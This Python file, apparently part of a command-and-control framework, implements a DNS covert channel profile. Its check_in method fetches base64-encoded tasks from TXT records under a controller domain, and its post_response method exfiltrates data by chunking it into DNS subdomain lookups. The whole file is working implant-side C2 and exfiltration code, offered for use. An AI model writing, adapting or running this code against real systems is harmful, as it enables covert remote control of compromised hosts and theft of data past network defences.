c2_profiles/dns_covert/__init__.py
"""
DNS Covert Channel C2 Profile Implementation
"""
import base64
import json
import socket
import time
from typing import Dict, List, Any

try:
    import dns.resolver # type: ignore
    import dns.message  # type: ignore
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

class DNSCovert:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.dns_server = config.get("dns_server", "8.8.8.8")
        self.domain = config.get("domain", "example.com")
        self.pending_tasks: Dict[str, List[Dict]] = {}
        
    def check_in(self, device_id: str) -> List[Dict]:
        """Check for tasks via DNS queries"""
        if not DNS_AVAILABLE:
            return []
        
        try:
            # Query for tasks using TXT records
            query_domain = f"{device_id}.tasks.{self.domain}"
            
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_server]
            
            try:
                answers = resolver.resolve(query_domain, 'TXT')
                tasks = []
                
                for answer in answers:
                    # Decode base64 encoded task data
                    task_data = base64.b64decode(str(answer).strip('"'))
                    task = json.loads(task_data.decode())
                    tasks.append(task)
                
                return tasks
                
            except dns.resolver.NXDOMAIN:
                # No tasks available
                return []
                
        except Exception as e:
            print(f"[!] DNS check-in failed: {e}")
            return []
    
    def post_response(self, device_id: str, encrypted_data: bytes) -> bool:
        """Exfiltrate response via DNS queries"""
        try:
            # Encode response as base64 and split into DNS-safe chunks
            encoded_data = base64.b64encode(encrypted_data).decode()
            
            # DNS labels are limited to 63 characters
            chunk_size = 60
            chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
            
            for i, chunk in enumerate(chunks):
                query_domain = f"{chunk}.{i}.{device_id}.data.{self.domain}"
                
                try:
                    # Perform DNS query to exfiltrate data
                    socket.gethostbyname(query_domain)
                except socket.gaierror:
                    # Expected - we're just sending data via DNS queries
                    pass
            
            return True
            
        except Exception as e:
            print(f"[!] DNS response failed: {e}")
            return False
